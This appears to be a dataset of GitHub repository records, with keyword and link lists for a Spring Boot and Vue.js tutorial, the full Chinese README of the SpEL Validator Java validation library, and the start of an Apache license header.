'need', 'additional', 'tooling', 'use', 'typescript', 'vue', 'citizen', 'support', 'also', 'huge', 'documentation', 'typescript', 'http', 'also', 'recommend', 'http', 'migrate', 'project', 'command', 'first', 'question', 'arises', 'whether', 'use', 'component', 'syntax', 'use', 'think', 'interface', 'definition', 'component', 'concise', 'enough', 'without', 'let', 'see', 'work', 'output', 'went', 'componentes', 'view', 'extended', 'also', 'changed', 'need', 'transform', 'javascript', 'code', 'typescript', 'really', 'good', 'introduction', 'could', 'found', 'http', 'process', 'take', 'depending', 'code', 'mainly', 'knowledge', 'typescript', 'think', 'great', 'path', 'go', 'forget', 'deactivate', 'source', 'control', 'file', 'generated', 'aka', 'transpiled', 'typescript', 'checked', 'anymore', 'enhanced', 'like', 'vuex', 'store', 'typescript', 'according', 'http', 'order', 'use', 'vuex', 'store', 'typescript', 'must', 'declare', 'module', 'augmentation', 'tldr', 'need', 'create', 'file', 'bootstrap', 'support', 'view', 'based', 'library', 'brings', 'nice', 'bootstrap', 'cs', 'stylings', 'component', 'compatible', 'http', 'unclear', 'going', 'support', 'even', 'upgrade', 'based', 'component', 'view', 'stopped', 'working', 'also', 'another', 'change', 'bootstrap', 'next', 'evolutionary', 'step', 'even', 'dropped', 'need', 'jquery', 'also', 'bootstrap', 'supported', 'right', 'let', 'try', 'use', 'bootstrap', 'without', 'therefore', 'install', 'bootstrap', 'next', 'like', 'stand', 'new', 'version', 'since', 'bootstrap', 'depends', 'tooltips', 'see', 'http', 'j', 'also', 'need', 'include', 'remove', 'also', 'need', 'import', 'bootstrap', 'inside', 'let', 'try', 'use', 'bootstrap', 'inside', 'also', 'inside', 'using', 'bootstrap', 'component', 'without', 'seems', 'problem', 'see', 'doc', 'use', 'http', 'build', 'run', 'docker', 'issue', 'question', 'build', 'run', 'app', 'docker', 'already', 'stated', 'issue', 'multiple', 'way', 'one', 'want', 'outline', 'variant', 'know', 'exacltly', 'going', 'behind', 'scene', 'first', 'make', 'use', 'docker', 'build', 'feature', 'first', 'stage', 'build', 'spring', 'boot', 'app', 'using', 'established', 'maven', 'build', 'process', 'let', 'look', 'dockerfile', 'crucial', 'part', 'add', 'necessary', 'file', 'docker', 'build', 'context', 'leaving', 'underlying', 'o', 'specific', 'node', 'library', 'leaving', 'would', 'lead', 'error', 'like', 'therefore', 'create', 'file', 'leave', 'directory', 'completely', 'using', 'configuration', 'also', 'ignore', 'output', 'directory', 'second', 'stage', 'dockerfile', 'use', 'build', 'output', 'first', 'stage', 'prepare', 'everything', 'run', 'spring', 'boot', 'powered', 'app', 'later', 'everything', 'prepared', 'run', 'docker', 'build', 'build', 'take', 'since', 'maven', 'npm', 'dependency', 'need', 'downloaded', 'build', 'build', 'finished', 'simply', 'start', 'docker', 'container', 'based', 'newly', 'build', 'image', 'prepare', 'correct', 'port', 'bound', 'docker', 'host', 'easier', 'access', 'later', 'look', 'running', 'docker', 'container', 'see', 'new', 'container', 'want', 'see', 'typical', 'spring', 'boot', 'startup', 'log', 'use', 'access', 'dockerized', 'spring', 'boot', 'powererd', 'app', 'inside', 'browser', 'http', 'played', 'enough', 'dockerized', 'app', 'forget', 'stop', 'remove', 'end', 'autorelease', 'docker', 'hub', 'also', 'want', 'current', 'version', 'code', 'build', 'released', 'http', 'therefore', 'head', 'repository', 'tab', 'docker', 'hub', 'click', 'doc', 'state', 'config', 'option', 'setup', 'automated', 'build', 'finally', 'see', 'docker', 'image', 'released', 'http', 'could', 'run', 'app', 'simply', 'executing', 'pull', 'latest', 'image', 'run', 'app', 'locally', 'head', 'http', 'see', 'app', 'live', 'run', 'jdk', 'ff', 'spring', 'boot', 'define', 'desired', 'java', 'version', 'simply', 'editing', 'backend', 'want', 'place', 'version', 'like', 'see', 'stackoverflow', 'answer', 'spring', 'boot', 'handle', 'needed', 'tell', 'java', 'version', 'build', 'specific', 'target', 'set', 'baseline', 'since', 'set', 'newer', 'version', 'standard', 'build', 'older', 'version', 'fail', 'see', 'build', 'log', 'example', 'additionally', 'use', 'github', 'action', 'run', 'maven', 'build', 'mayor', 'java', 'version', 'look', 'workflow', 'secure', 'spring', 'boot', 'backend', 'protect', 'frontend', 'securing', 'part', 'application', 'must', 'consist', 'two', 'part', 'securing', 'spring', 'boot', 'backend', 'reacting', 'secured', 'backend', 'frontend', 'http', 'http', 'http', 'http', 'secure', 'backend', 'api', 'spring', 'security', 'http', 'http', 'http', 'let', 'focus', 'securing', 'spring', 'boot', 'backend', 'first', 'therefore', 'introduce', 'new', 'restful', 'resource', 'want', 'secure', 'specifically', 'configure', 'spring', 'security', 'first', 'add', 'new', 'rest', 'resource', 'inside', 'backendcontroller', 'want', 'secure', 'use', 'separate', 'frontend', 'later', 'spring', 'relatively', 'easy', 'secure', 'api', 'let', 'add', 'also', 'create', 'new', 'configuration', 'annotated', 'class', 'called', 'using', 'simple', 'configure', 'provide', 'basic', 'authentication', 'secured', 'resource', 'deep', 'dive', 'matcher', 'configuration', 'look', 'http', 'aware', 'csrf', 'aware', 'csrf', 'cross', 'site', 'request', 'forgery', 'part', 'default', 'render', 'http', 'forbidden', 'http', 'verb', 'modifies', 'state', 'patch', 'post', 'put', 'delete', 'default', 'spring', 'security', 'csrf', 'protection', 'produce', 'http', 'access', 'denied', 'disable', 'default', 'behavior', 'testing', 'secured', 'backend', 'see', 'http', 'inside', 'backendcontrollertest', 'check', 'whether', 'api', 'reacts', 'correct', 'http', 'unauthorized', 'called', 'without', 'user', 'credential', 'using', 'also', 'test', 'one', 'could', 'access', 'api', 'correctly', 'credential', 'included', 'crucial', 'point', 'use', 'configuration', 'inject', 'correct', 'credential', 'properly', 'configure', 'credential', 'inside', 'environment', 'variable', 'defining', 'user', 'password', 'inside', 'code', 'like', 'given', 'access', 'application', 'practice', 'super', 'simple', 'example', 'application', 'could', 'solution', 'quite', 'similar', 'much', 'safe', 'would', 'able', 'extract', 'code', 'configuration', 'later', 'use', 'spring', 'powerful', 'mechanism', 'overriding', 'configuration', 'environment', 'variable', 'could', 'store', 'safely', 'inside', 'deployment', 'pipeline', 'setting', 'secured', 'another', 'login', 'heroku', 'config', 'vars', 'therefore', 'first', 'step', 'would', 'delete', 'following', 'code', 'add', 'following', 'configuration', 'running', 'test', 'using', 'old', 'credential', 'fail', 'providing', 'newer', 'one', 'test', 'go', 'green', 'introducing', 'environment', 'variable', 'game', 'could', 'also', 'done', 'locally', 'inside', 'ide', 'example', 'first', 'change', 'test', 'choose', 'new', 'credential', 'like', 'user', 'pw', 'change', 'right', 'use', 'ide', 'run', 'configuration', 'insert', 'two', 'environment', 'variable', 'test', 'run', 'green', 'new', 'value', 'protect', 'part', 'frontend', 'secured', 'specific', 'part', 'backend', 'api', 'let', 'also', 'secure', 'part', 'frontend', 'create', 'new', 'vue', 'login', 'component', 'already', 'secured', 'backend', 'api', 'also', 'want', 'secured', 'frontend', 'part', 'every', 'solution', 'find', 'net', 'seems', 'quite', 'overengineered', 'bother', 'frontend', 'auth', 'store', 'like', 'vuex', 'beginning', 'start', 'oauth', 'right', 'front', 'could', 'easily', 'added', 'later', 'simplest', 'solution', 'one', 'could', 'think', 'secure', 'frontend', 'would', 'create', 'simple', 'component', 'simply', 'access', 'resource', 'every', 'time', 'login', 'used', 'therefore', 'use', 'conditionals', 'show', 'something', 'new', 'conditional', 'handled', 'two', 'boolean', 'value', 'bring', 'life', 'implement', 'method', 'simple', 'implementation', 'login', 'component', 'asks', 'spring', 'boot', 'backend', 'user', 'allowed', 'access', 'resource', 'provides', 'method', 'us', 'axios', 'basic', 'auth', 'feature', 'login', 'component', 'work', 'first', 'time', 'protect', 'multiple', 'component', 'working', 'login', 'component', 'let', 'create', 'new', 'component', 'since', 'want', 'something', 'accessible', 'somebody', 'logged', 'correctly', 'component', 'visible', 'appropriate', 'access', 'granted', 'login', 'therefore', 'need', 'solve', 'problem', 'store', 'login', 'state', 'redirect', 'user', 'authenticated', 'store', 'login', 'information', 'vuex', 'super', 'dooper', 'simple', 'solution', 'would', 'simply', 'use', 'vuex', 'centralized', 'state', 'management', 'pretty', 'popular', 'invest', 'time', 'get', 'familiar', 'full', 'guide', 'available', 'http', 'great', 'introductory', 'blog', 'post', 'http', 'could', 'also', 'initialize', 'new', 'project', 'vue', 'cli', 'mark', 'checkbox', 'try', 'extend', 'current', 'project', 'first', 'add', 'vuex', 'dependency', 'four', 'thing', 'go', 'vuex', 'module', 'initial', 'state', 'getters', 'mutation', 'action', 'define', 'vuex', 'state', 'implement', 'create', 'new', 'file', 'initial', 'state', 'login', 'could', 'successful', 'define', 'vuex', 'action', 'login', 'mutation', 'look', 'onto', 'vuex', 'action', 'provide', 'way', 'commit', 'mutation', 'vuex', 'store', 'app', 'super', 'simple', 'one', 'action', 'implement', 'omit', 'action', 'define', 'one', 'admin', 'user', 'spring', 'boot', 'backend', 'right', 'need', 'implemented', 'logout', 'right', 'could', 'implemented', 'later', 'shift', 'logic', 'login', 'user', 'vuex', 'action', 'method', 'instead', 'directly', 'setting', 'boolean', 'variable', 'mutation', 'store', 'authentication', 'request', 'successful', 'unsuccessful', 'therefore', 'implement', 'two', 'simple', 'mutation', 'last', 'least', 'define', 'getters', 'vuex', 'state', 'able', 'access', 'vuex', 'state', 'within', 'component', 'need', 'implement', 'getters', 'inside', 'vuex', 'store', 'want', 'simple', 'info', 'need', 'following', 'getters', 'use', 'vuex', 'store', 'inside', 'login', 'component', 'forward', 'login', 'succeeded', 'instead', 'directly', 'calling', 'auth', 'endpoint', 'via', 'axios', 'inside', 'login', 'component', 'want', 'use', 'vuex', 'store', 'action', 'instead', 'therefore', 'even', 'need', 'import', 'inside', 'simply', 'access', 'thy', 'already', 'inside', 'configuration', 'accessible', 'within', 'every', 'vue', 'component', 'prefixed', 'look', 'see', 'action', 'access', 'vuex', 'store', 'action', 'issue', 'login', 'request', 'spring', 'boot', 'backend', 'succeeds', 'use', 'vue', 'forward', 'user', 'component', 'redirect', 'user', 'authenticated', 'let', 'enhance', 'slightly', 'use', 'router', 'meta', 'field', 'feature', 'check', 'whether', 'user', 'loggin', 'already', 'therefore', 'able', 'access', 'protected', 'component', 'uri', 'also', 'add', 'new', 'behavior', 'router', 'check', 'requires', 'authentication', 'every', 'time', 'route', 'accessed', 'redirect', 'login', 'component', 'one', 'click', 'onto', 'login', 'prior', 'application', 'redirects', 'automatically', 'redirect', 'also', 'need', 'part', 'inside', 'since', 'case', 'successful', 'login', 'user', 'directly', 'redirected', 'check', 'auth', 'state', 'secured', 'backend', 'endpoint', 'already', 'wanted', 'first', 'place', 'spring', 'boot', 'backend', 'secured', 'api', 'endpoint', 'work', 'simple', 'authentication', 'frontend', 'us', 'endpoint', 'login', 'protect', 'component', 'user', 'log', 'login', 'state', 'held', 'frontend', 'using', 'store', 'want', 'go', 'step', 'ahead', 'call', 'secured', 'api', 'endpoint', 'backend', 'within', 'frontend', 'component', 'need', 'fully', 'store', 'credential', 'inside', 'store', 'could', 'access', 'secured', 'resource', 'therefore', 'enhance', 'sure', 'use', 'current', 'way', 'define', 'interact', 'vuex', 'mutation', 'lot', 'blog', 'post', 'using', 'old', 'way', 'committing', 'multiple', 'parameter', 'like', 'work', 'anymore', 'first', 'parameter', 'set', 'others', 'lost', 'inside', 'use', 'stored', 'credential', 'access', 'endpoint', 'feel', 'free', 'create', 'nice', 'gui', 'based', 'link', 'nice', 'introductory', 'video', 'http', 'example', 'http', 'easy', 'use', 'editor', 'http']","['http', 'use', 'spring', 'component', 'need']",14,0,0,"['upgrade', 'procedure', 'in', 'search', 'new', 'web', 'year', 'absence', 'setup', 'spring', 'boot', 'prerequisite', 'macosx', 'linux', 'window', 'project', 'setup', 'backend', 'frontend', 'use', 'handle', 'npm', 'node', 'bower', 'grunt', 'gulp', 'webpack', 'tell', 'webpack', 'output', 'content', 'first', 'app', 'run', 'faster', 'feedback', 'browser', 'developer', 'tool', 'extension', 'intellij', 'integration', 'http', 'call', 'spring', 'boot', 'rest', 'backend', 'the', 'problem', 'sop', 'enable', 'axios', 'cors', 'support', 'enable', 'spring', 'boot', 'cors', 'support', 'but', 'stop', 'webpack', 'vue', 'something', 'much', 'smarter', 'u', 'help', 'u', 'sop', 'use', 'history', 'mode', 'nicer', 'url', 'bootstrap', 'heroku', 'deployment', 'access', 'spring', 'boot', 'rest', 'backend', 'heroku', 'frontend', 'use', 'heroku', 'postgres', 'database', 'spring', 'boot', 'backend', 'frontend', 'test', 'install', 'jest', 'jest', 'configuration', 'integration', 'maven', 'build', 'via', 'run', 'jest', 'test', 'inside', 'intellij', 'test', 'nightwatch', 'write', 'nightwatch', 'test', 'run', 'test', 'run', 'test', 'npm', 'security', 'shift', 'templates', 'architecture', 'vue', 'cli', 'omg', 'my', 'small', 'vue', 'cli', 'plugins', 'the', 'file', 'update', 'vue', 'exist', 'project', 'upgrade', 'next', 'upgrade', 'add', 'typescript', 'typescript', 'vuex', 'store', 'typescript', 'bootstrap', 'support', 'build', 'run', 'docker', 'docker', 'build', 'building', 'app', 'maven', 'just', 'echo', 'see', 'everything', 'run', 'maven', 'build', 'exclude', 'underlie', 'o', 'specific', 'node', 'module', 'also', 'leave', 'output', 'folder', 'just', 'use', 'build', 'artifact', 'remove', 'add', 'spring', 'boot', 'container', 'fire', 'spring', 'boot', 'app', 'default', 'autorelease', 'docker', 'hub', 'run', 'jdk', 'ff', 'secure', 'spring', 'boot', 'backend', 'protect', 'frontend', 'secure', 'backend', 'api', 'spring', 'security', 'configure', 'spring', 'security', 'be', 'aware', 'csrf', 'test', 'secure', 'backend', 'configure', 'credential', 'inside', 'environment', 'variable', 'protect', 'part', 'frontend', 'create', 'new', 'vue', 'login', 'component', 'protect', 'multiple', 'component', 'store', 'login', 'information', 'vuex', 'define', 'vuex', 'state', 'define', 'vuex', 'action', 'login', 'mutation', 'last', 'least', 'define', 'getters', 'vuex', 'state', 'use', 'vuex', 'store', 'inside', 'login', 'component', 'forward', 'login', 'succeed', 'redirect', 'user', 'authenticate', 'check', 'auth', 'state', 'secure', 'backend', 'endpoint', 'link']",77,"['spring', 'boot', 'backend', 'run', 'test']",97,10.0,3.0,"[com.github.eirslett:frontend-maven-plugin,maven-resources-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0,90637,44.14963503649635,4.992725469124577,"['![Build Status -> https://github.com/jonashackt/spring-boot-vuejs/workflows/build/badge.svg', '![codecov -> https://codecov.io/gh/jonashackt/spring-boot-vuejs/branch/master/graph/badge.svg?token=gMQBTyKuKS', '![License -> http://img.shields.io/:license-mit-blue.svg', '![renovateenabled -> https://img.shields.io/badge/renovate-enabled-yellow', '![versionspringboot -> https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27parent%27%5D%2F%2A%5Blocal-name%28%29%3D%27version%27%5D&label=springboot', '![versionjava -> https://img.shields.io/badge/jdk-8,_11,_15-brightgreen.svg?logo=java', '![versionvuejs -> https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.vue&label=vue&logo=vue.js', '![versiontypescript -> https://img.shields.io/badge/dynamic/json?color=blue&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.devDependencies.typescript&label=typescript&logo=typescript', '![versionbootstrap -> https://img.shields.io/badge/dynamic/json?color=blueviolet&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.bootstrap&label=bootstrap&logo=bootstrap.js', '![versionnodejs -> https://img.shields.io/badge/dynamic/xml?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/pom.xml&query=%2F%2A%5Blocal-name%28%29%3D%27project%27%5D%2F%2A%5Blocal-name%28%29%3D%27build%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugins%27%5D%2F%2A%5Blocal-name%28%29%3D%27plugin%27%5D%2F%2A%5Blocal-name%28%29%3D%27executions%27%5D%2F%2A%5Blocal-name%28%29%3D%27execution%27%5D%2F%2A%5Blocal-name%28%29%3D%27configuration%27%5D%2F%2A%5Blocal-name%28%29%3D%27nodeVersion%27%5D&label=nodejs&logo=node.js', '![versionwebpack -> https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.webpack.version&label=webpack&logo=webpack', '![versionaxios -> https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package.json&query=$.dependencies.axios&label=axios', '![versionjest -> https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.jest.version&label=jest&logo=jest', '![versionnightwatch -> https://img.shields.io/badge/dynamic/json?color=brightgreen&url=https://raw.githubusercontent.com/jonashackt/spring-boot-vuejs/master/frontend/package-lock.json&query=$.dependencies.nightwatch.version&label=nightwatch', '![Deployed on Heroku -> https://img.shields.io/badge/heroku-deployed-blueviolet.svg?logo=heroku', '![Pushed to Docker Hub -> https://img.shields.io/badge/docker_hub-released-blue.svg?logo=docker', 'vue-cli-v2-webpack-v3 -> https://github.com/jonashackt/spring-boot-vuejs/tree/vue-cli-v2-webpack-v3', '![java-magazin-8.2018](screenshots/java-magazin-8.2018.png) -> https://jaxenter.de/ausgaben/java-magazin-8-18', '![entwickler-press-092018](screenshots/entwickler-press-092018.jpg) -> https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook', '![softwerker-vol12](screenshots/softwerker-vol12.png) -> https://info.codecentric.de/softwerker-vol-12', 'blog.codecentric.de/en/2018/04/spring-boot-vuejs -> https://blog.codecentric.de/en/2018/04/spring-boot-vuejs', 'JavaMagazin 8.2018 -> https://jaxenter.de/ausgaben/java-magazin-8-18', 'entwickler.press shortcuts 229 -> https://www.amazon.com/Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook/dp/B07HQF9VX4/ref=sr_1_1?ie=UTF8&qid=1538484852&sr=8-1&keywords=Vue-js-f%C3%BCr-alle-Wissenswertes-Einsteiger-ebook', 'softwerker Vol.12 -> https://info.codecentric.de/softwerker-vol-12', 'introduction phrase -> https://vuejs.org/v2/guide/index.html', 'vue.config.js -> https://cli.vuejs.org/config/#vue-config-js', 'Axios -> https://github.com/mzabriskie/axios', 'Daniel -> https://www.codecentric.de/team/dre/', 'Vue CLI 3 docs -> https://cli.vuejs.org/config', 'configure is a devserver-proxy -> https://cli.vuejs.org/config/#devserver-proxy', 'vue.config.js -> https://cli.vuejs.org/config/#vue-config-js', 'http-proxy-middleware -> https://github.com/chimurai/http-proxy-middleware', 'HTML5 history mode -> https://router.vuejs.org/guide/essentials/history-mode.html#html5-history-mode', ""Vue.js docs don't provide an example configuration for Spring Boot -> https://router.vuejs.org/guide/essentials/history-mode.html#example-server-configurations"", 'there are other resources -> https://www.baeldung.com/spring-redirect-and-forward', 'automatically set by Heroku every time, we (re-)start our App -> https://stackoverflow.com/a/12023039/4964553', 'try out your Heroku app locally -> https://devcenter.heroku.com/articles/heroku-local', 'frontend/src/components/http-common.js -> https://github.com/jonashackt/spring-boot-vuejs/blob/master/frontend/src/components/http-common.js', 'Heroku Postgres database -> https://elements.heroku.com/addons/heroku-postgresql', 'http://nightwatchjs.org/img/operation.png -> http://nightwatchjs.org/img/operation.png', 'webpack -> https://github.com/vuejs-templates/webpack', 'vue.config.js -> https://cli.vuejs.org/config/#vue-config-js', 'the latest version of vue currently is `2.6.x` and `3.x` is considered `next` -> https://www.npmjs.com/package/vue', 'As John stated in his post -> https://johnpapa.net/vue2-to-vue3/', 'I assume you have `npm install -g @vue/cli` installed -> https://v3.vuejs.org/guide/migration/introduction.html#quickstart', ""shouldn't be checked in (anymore) -> https://stackoverflow.com/a/26464907/4964553"", 'Bootstrap 5.x is here to be the next evolutionary step - and it even dropped the need for JQuery -> https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/', 'jonashackt/spring-boot-vuejs/issues/25 -> https://github.com/jonashackt/spring-boot-vuejs/issues/25', ""Docker's multi-stage build feature -> https://docs.docker.com/develop/develop-images/multistage-build/"", 'to errors like -> https://stackoverflow.com/questions/37986800/node-sass-could-not-find-a-binding-for-your-current-environment?page=1&tab=active#tab-top', 'http://localhost:8098 -> http://localhost:8098', 'setup automated builds -> https://docs.docker.com/docker-hub/builds/', 'http://localhost:8098/ -> http://localhost:8098/', 'this stackoverflow answer -> https://stackoverflow.com/questions/54467287/how-to-specify-java-11-version-in-spring-spring-boot-pom-xml', 'this build log for example -> https://travis-ci.org/jonashackt/spring-boot-vuejs/builds/547227298', 'HTTP 403 FORBIDDEN for any HTTP verb that modifies state (PATCH, POST, PUT, DELETE) -> https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#csrf-configure', 'Vue.js conditionals -> https://vuejs.org/v2/guide/conditional.html', 'vuex -> https://github.com/vuejs/vuex', 'the vuex dependency -> https://www.npmjs.com/package/vuex', 'state -> https://vuex.vuejs.org/guide/state.html', 'getters -> https://vuex.vuejs.org/guide/getters.html', 'mutations -> https://vuex.vuejs.org/guide/mutations.html', 'actions -> https://vuex.vuejs.org/guide/actions.html', ""router.js](frontend/src/router.js) slightly. We use the Vue.js routers' [meta field -> https://router.vuejs.org/guide/advanced/meta.html"", 'interact with vuex mutations -> https://vuex.vuejs.org/guide/mutations.html', 'context', '           main', '           main', '           main', '           main', '           main', '           main', '           main', 'Tomcat', '           main', '           main', '           main', 'Tomcat', 'localhost', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', '           main', 'Tomcat']",103
stick-i/spel-validator,main,"# SpEL Validator

[![Coverage Status](https://coveralls.io/repos/github/stick-i/spel-validator/badge.svg?branch=main)](https://coveralls.io/github/stick-i/spel-validator?branch=main)
[![Maven Central](https://img.shields.io/maven-central/v/cn.sticki/spel-validator.svg)](https://central.sonatype.com/search?q=g:cn.sticki%20a:spel-validator)
[![license](https://img.shields.io/github/license/stick-i/spel-validator)](https://github.com/stick-i/spel-validator/blob/main/LICENSE)

一个强大的 Java 参数校验包，基于 SpEL 实现，扩展自 javax.validation 包，用于简化参数校验，几乎支持所有场景下的参数校验。

## 项目地址

- GitHub：https://github.com/stick-i/spel-validator
- Gitee：https://gitee.com/sticki/spel-validator
- 在线文档：https://spel-validator.sticki.cn/

## 特点

- 简单易用，使用方式几乎与 javax.validation 一致，学习成本低，上手快。
- 强大的参数校验功能，几乎支持所有场景下的参数校验。
- 扩展自 javax.validation 包，只新增不修改，无缝集成到项目中。
- 基于 SpEL（Spring Expression Language） 表达式，支持复杂的校验逻辑。
- 支持调用 Spring Bean，可在表达式中使用注入过的 Spring Bean。
- 校验时基于整个对象，支持对象内字段间的校验逻辑。
- 支持自定义校验注解，可根据业务需求自定义校验逻辑。
- 无需额外的异常处理，校验失败时会上报到 javax.validation 的异常体系中。

## 支持的环境

JDK8+

## 交流群

请添加微信号 `sticki6`，备注 `SpEL`，我拉你入群。

## 它解决了什么问题？

- 枚举值字段校验：
  ```java
  @SpelAssert(assertTrue = "" T(cn.sticki.enums.UserStatusEnum).getByCode(#this.userStatus) != null "", message = ""用户状态不合法"")
  private Integer userStatus;
  ```

- 多字段联合校验：
  ```java
  @NotNull
  private Integer contentType;
  
  @SpelNotNull(condition = ""#this.contentType == 1"", message = ""语音内容不能为空"")
  private Object audioContent;
  
  @SpelNotNull(condition = ""#this.contentType == 2"", message = ""视频内容不能为空"")
  private Object videoContent;
  ```

- 复杂逻辑校验，调用静态方法：
  ```java
  // 中文算两个字符，英文算一个字符，要求总长度不超过 10
  // 调用外部静态方法进行校验
  @SpelAssert(assertTrue = ""T(cn.sticki.util.StringUtil).getLength(#this.userName) <= 10"", message = ""用户名长度不能超过10"")
  private String userName;
  ```

- 调用 Spring Bean（需要使用 @EnableSpelValidatorBeanRegistrar 开启Spring Bean支持）：
  ```java
  // 这里只是简单举例，实际开发中不建议这样判断用户是否存在
  @SpelAssert(assertTrue = ""@userService.getById(#this.userId) != null"", message = ""用户不存在"")
  private Long userId;
  ```

- 更多使用场景，欢迎探索和补充！

## 📦 快速开始

- 添加依赖

  Latest Version:
  [![Maven Central](https://img.shields.io/maven-central/v/cn.sticki/spel-validator.svg)](https://central.sonatype.com/search?q=g:cn.sticki%20a:spel-validator)
  ```xml
  <dependency>
      <groupId>cn.sticki</groupId>
      <artifactId>spel-validator</artifactId>
      <version>Latest Version</version>
  </dependency>
  ```

- 在接口参数上使用 `@Valid` 或 `@Validated` 注解

  ```java
  @RestController
  @RequestMapping(""/example"")
  public class ExampleController {
  
    /**
     * 简单校验示例
     */
    @PostMapping(""/simple"")
    public Resp<Void> simple(@RequestBody @Valid SimpleExampleParamVo simpleExampleParamVo) {
      return Resp.ok(null);
    }

  }
  ```

- 在实体类上使用 `@SpelValid` 注解，同时在需要校验的字段上使用 `@SpelNotNull` 等约束注解

  ```java
  @Data
  @SpelValid // 添加启动注解
  public class SimpleExampleParamVo {
  
    @NotNull
    private Boolean switchAudio;
  
    /**
     * 此处开启了注解校验
     * 当 switchAudio 字段为 true 时，校验 audioContent，audioContent 不能为null
     */
    @SpelNotNull(condition = ""#this.switchAudio == true"", message = ""语音内容不能为空"")
    private Object audioContent;
  
  }
  ```

- 添加全局异常处理器，处理校验异常

  ```java
  @RestControllerAdvice
  public class ControllerExceptionAdvice {

    @ExceptionHandler({BindException.class, MethodArgumentNotValidException.class})
    public Resp<Void> handleBindException(BindException ex) {
      String msg = ex.getFieldErrors().stream()
          .map(error -> error.getField() + "" "" + error.getDefaultMessage())
          .reduce((s1, s2) -> s1 + "","" + s2)
          .orElse("""");
      return new Resp<>(400, msg);
    }
  
  }
  ```

- 发起请求，即可看到校验结果
  <details>
  <summary>示例一：@SpelNotNull 校验不通过</summary>

  - 请求体：

    ```json
    {
      ""switchAudio"": true,
      ""audioContent"": null
    }
    ```

  - 响应体
    ```json
    {
      ""code"": 400,
      ""message"": ""audioContent 语音内容不能为空"",
      ""data"": null
    }
    ```

  </details>

  <details>
  <summary>示例二：校验通过</summary>

  - 请求体
    ```json
    {
      ""switchAudio"": false,
      ""audioContent"": null
    }
    ```

  - 响应体
    ```json
    {
      ""code"": 200,
      ""message"": ""成功"",
      ""data"": null
    }
    ```

  </details>

  <details>
  <summary>示例三：@NotNull 校验不通过</summary>

  - 请求体
    ```json
    {
      ""switchAudio"": null,
      ""audioContent"": null
    }
    ```

  - 响应体
    ```json
    {
      ""code"": 400,
      ""message"": ""switchAudio 不能为null"",
      ""data"": null
    }
    ```
    </details>

## 📦 示例项目

- [spel-validator-example](https://github.com/stick-i/spel-validator-example)

## 🤝 贡献指南

非常欢迎您来参与项目贡献，但希望您可以先在 issue 中提出您的想法，我们可以一起讨论，然后再进行代码编写。

### 分支说明

- `main`：主分支，已发布的最新版本代码将合入此分支。
- `vX.Y.Z`：版本分支，用于汇总及验证新版本的功能，已经发布的版本会将分支删除。
- `dev-num-desc`：开发分支，用于开发新功能，每个dev分支都应当对应一个issue，功能开发完成后通过PR合入 `vX.Y.Z` 分支，并删除当前分支。
- `docs`：文档分支，修改文档的内容将提交到这里。

## License

[Apache-2.0](https://github.com/stick-i/spel-validator/blob/main/LICENSE)

## 📧 联系作者

- Email: sticki@126.com
- 微信: sticki6
- 公众号: 程序员阿杆

## 💰 捐赠支持

| 微信赞赏                                                 | 支付宝赞赏                                            |
|------------------------------------------------------|--------------------------------------------------|
| ![微信](./document/image/wechat-appreciation-code.jpg) | ![支付宝](./document/image/alipay-receipt-code.jpg) |
",6,9,4,apache-2.0,25.0,"['spel', 'validator', 'java', 'spel', 'expression', 'spring', 'spring', 'spring', 'enablespelvalidatorbeanregistrar', 'latest', 'version', 'issue', 'license', 'email', 'sticki']","['spring', 'spel', 'validator', 'java', 'expression']",7,0,0,"['spel', 'validator', 'license']",13,"['spel', 'validator', 'license']",14,17.0,1.0,"[com.github.hazendaz.maven:coveralls-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,5355,78.0,6.172161172161172,"['![Coverage Status -> https://coveralls.io/repos/github/stick-i/spel-validator/badge.svg?branch=main', '![Maven Central -> https://img.shields.io/maven-central/v/cn.sticki/spel-validator.svg', '![license -> https://img.shields.io/github/license/stick-i/spel-validator', '![Maven Central -> https://img.shields.io/maven-central/v/cn.sticki/spel-validator.svg', 'spel-validator-example -> https://github.com/stick-i/spel-validator-example', 'Apache-2.0 -> https://github.com/stick-i/spel-validator/blob/main/LICENSE']",6
apache/bigtop-manager,main,"<!---
   Licensed to the Apache Software Foundation (ASF) under one or more
   contributor license agreements.  See the NOTICE file distributed with
   this work for additional information regarding copyright ownership.
   The ASF licenses this file to You under the Apache License, Version 2.0
   (the ""License""); you may not use this file except in compliance with
   the License.  You may obtain a copy of the License at

